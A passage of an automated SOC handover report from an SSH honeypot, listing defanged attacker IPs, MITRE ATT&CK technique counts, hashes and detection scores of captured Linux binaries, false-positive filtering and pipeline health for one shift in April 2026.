| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.126.54[.]36` | **24** | 2026-04-20 15:50 | 2026-04-20 16:05 | 36m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.64[.]89` | **5** | 2026-04-20 15:52 | 2026-04-20 15:54 | 4m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `135.237.126[.]116` | **2** | 2026-04-20 15:45 | 2026-04-20 15:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `180.76.61[.]133` | **2** | 2026-04-20 16:55 | 2026-04-20 17:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `113.137.40[.]250` | 1 | 2026-04-20 15:49 | 2026-04-20 15:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.44.214[.]138` | 1 | 2026-04-20 16:18 | 2026-04-20 16:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.168[.]33` | 1 | 2026-04-20 15:48 | 2026-04-20 15:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]167` | 1 | 2026-04-20 15:49 | 2026-04-20 15:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.214[.]161` | 1 | 2026-04-20 16:05 | 2026-04-20 16:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.146[.]235` | 1 | 2026-04-20 15:59 | 2026-04-20 16:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `201.76.120[.]30` | 1 | 2026-04-20 15:59 | 2026-04-20 15:59 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.136.110[.]113` | 1 | 2026-04-20 15:49 | 2026-04-20 15:51 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `113.44.214[.]138` | CN | Huawei Public Cloud Service (Huawei Software Technologies Ltd.Co) | **100** ⚠️ | 1 |
| `120.48.64[.]89` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 0 |
| `14.103.118[.]167` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `120.48.168[.]33` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 27 |
| `135.237.126[.]116` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `201.76.120[.]30` | BR | VERO S.A | **100** ⚠️ | 50 |
| `180.76.146[.]235` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `43.136.110[.]113` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **100** ⚠️ | 12 |
| `113.137.40[.]250` | CN | CHINANET SHAANXI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `14.29.214[.]161` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 43 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 6 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 2 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 56 cases |
| Tool 34  | Credential Extractor        | ✅ 12 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (16.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 6 priority case(s) shown individually · 12 recon entry/entries in table (4 group(s) consolidating 33 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-20T17:09:10Z_
